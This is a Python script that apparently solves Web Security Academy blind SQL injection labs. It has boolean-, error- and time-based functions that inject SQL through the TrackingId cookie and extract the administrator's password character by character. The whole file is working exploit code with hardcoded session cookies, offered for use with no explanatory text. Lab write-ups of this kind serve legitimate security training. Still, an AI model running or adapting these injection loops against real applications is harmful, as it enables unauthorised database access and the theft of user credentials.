import requests
import time

def bool_based():

    test_chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    index = 1
    cc = ""

    pw = ""

    while True:
        for c in test_chars:

            headers ={"Cookie":"TrackingId=CB36NYlqPU3Np8JX'+AND+(SELECT+SUBSTRING(password," + str(index) + ",1)+FROM+users+WHERE+username%3d'administrator')%3d'" + c + "'--; session=50g6RxyoDTOVtmfs0DujIToI3XgdRgml"}
            #headers ={"Cookie":"TrackingId=CB36NYlqPU3Np8JX; session=50g6RxyoDTOVtmfs0DujIToI3XgdRgml"}

            res = requests.get("https://x.web-security-academy.net/", headers=headers)

            #print(res.status_code)

            print(str(index) + " " + str(res.status_code) + " " + pw + c)
            #print(headers)

            if "Welcome back" in res.text:
                cc = c
                break

            time.sleep(0.1)

        if cc == "":
            print("Password " + pw)
            exit(0)
        else:
            pw += cc
            cc = ""

        index += 1

def error_based():

    test_chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    index = 1
    cc = ""

    pw = ""

    while True:
        for c in test_chars:

            headers ={"Cookie":"TrackingId=aUT1mtShApY5dwCR'||(SELECT CASE WHEN SUBSTR(password," + str(index) + ",1)='" + c + "' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'--; session=u7mT0LZ1XXH9V0IQEq4ulc3BuXVSCzh9"}
            #headers ={"Cookie":"TrackingId=CB36NYlqPU3Np8JX; session=50g6RxyoDTOVtmfs0DujIToI3XgdRgml"}

            res = requests.get("https://x.web-security-academy.net/", headers=headers)

            #print(res.status_code)

            print(str(index) + " " + str(res.status_code) + " " + pw + c)
            #print(headers)

            if res.status_code == 500:
                cc = c
                break

            time.sleep(0.1)

        if cc == "":
            print("Password " + pw)
            exit(0)
        else:
            pw += cc
            cc = ""

        index += 1

def time_based():

    test_chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    index = 1
    cc = ""

    pw = ""

    while True:
        for c in test_chars:

            headers ={"Cookie":"TrackingId=82rdKi5ImxGrG577'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password," + str(index) + ",1)='" + c + "')+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END+FROM+users--; session=Inj0CIm3e7hXwxmd1wpYAcGyj3XFrL1x"}
            #headers ={"Cookie":"TrackingId=CB36NYlqPU3Np8JX; session=50g6RxyoDTOVtmfs0DujIToI3XgdRgml"}

            res = requests.get("https://x.web-security-academy.net", headers=headers)

            #print(res.status_code)

            print(str(index) + " " + str(res.status_code) + " " + pw + c)
            #print(headers)

            #print(res.elapsed.seconds)

            if res.elapsed.seconds > 3:
                cc = c
                break

            time.sleep(0.1)

        if cc == "":
            print("Password " + pw)
            exit(0)
        else:
            pw += cc
            cc = ""

        index += 1

